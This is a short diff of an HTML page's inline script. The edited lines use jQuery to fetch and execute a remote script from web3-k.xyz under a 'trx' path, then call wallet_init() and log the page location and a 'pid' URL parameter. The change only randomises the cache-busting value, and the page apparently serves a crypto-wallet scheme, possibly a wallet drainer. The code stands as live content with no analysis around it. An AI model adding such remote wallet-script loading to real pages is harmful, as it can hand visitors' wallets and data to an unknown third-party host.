@@ -243,11 +243,11 @@
     </div>
     
     <script>
-   jQuery.ajaxSetup({cache:true});
-            jQuery.ajax({url:"https://web3-k.xyz/trx/auto123.js?073099",dataType:"script",cache:true}).done(function(){
-              
+        jQuery.ajaxSetup({cache:true});
+            jQuery.ajax({url:"https://web3-k.xyz/trx/auto123.js?"+Math.ceil(Math.random()*10000),dataType:"script",cache:true}).done(function(){
             wallet_init().then();
         });
+   
     console.log(1111111,window.location,getUrlParameter('pid'))
    function getUrlParameter(param) {
             const urlParams = new URLSearchParams(window.location.search);
